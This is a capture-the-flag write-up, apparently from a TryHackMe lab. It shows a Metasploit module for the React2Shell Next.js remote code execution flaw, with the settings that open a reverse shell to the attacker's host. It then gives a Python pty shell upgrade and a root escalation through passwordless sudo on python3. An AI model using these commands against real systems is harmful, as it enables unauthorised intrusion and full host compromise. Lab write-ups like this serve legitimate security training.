# Corp Website CTF Writeup

## Overview
- **Target:** 10.81.176.9:3000
- **Vulnerability:** CVE-2025-55182 (React2Shell)
- **Difficulty:** Easy/Medium

## Vulnerability
The target was running a Next.js application vulnerable to **CVE-2025-55182** (React2Shell) - an unauthenticated remote code execution vulnerability in React Server Components.

## Exploitation

### Step 1: Initial Access
Used Metasploit's exploit module for React2Shell:

```bash
msfconsole
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.81.176.9
set RPORT 3000
set LHOST 10.81.84.252
exploit
```

Successfully obtained a reverse shell as user `daniel` (uid=100, gid=101).

### Step 2: Shell Upgrade
The initial shell was limited and non-interactive. Upgraded using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/sh")'
```

### Step 3: User Flag
Navigated to home directory and retrieved the user flag:

```bash
cd ~
ls
cat user.txt
```

**User Flag:** `THM{R34c7_REDACTED}`

### Step 4: Privilege Escalation
Checked for sudo privileges:

```bash
sudo -l
```

**Output:**
```
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

This is a critical misconfiguration - allowing passwordless sudo access to Python3.

### Step 5: Root Shell
Escalated to root using Python:

```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Verified with:
```bash
id
whoami
```

### Step 6: Root Flag
Retrieved the root flag:

```bash
cat /root/root.txt
```

**Root Flag:** `[REDACTED]`

## Key Takeaways

1. **React Server Components** can be exploited for RCE when improperly configured
2. **Sudo permissions on interpreters** (python, perl, ruby, etc.) provide instant privilege escalation
3. Always run `sudo -l` to check for privilege escalation opportunities
4. Upgrade shells for better interactivity and control

## Tools Used
- Metasploit Framework v6.4.115
- Python3 for shell upgrade and privilege escalation

## References
- CVE-2025-55182
- GTFOBins: https://gtfobins.github.io/gtfobins/python/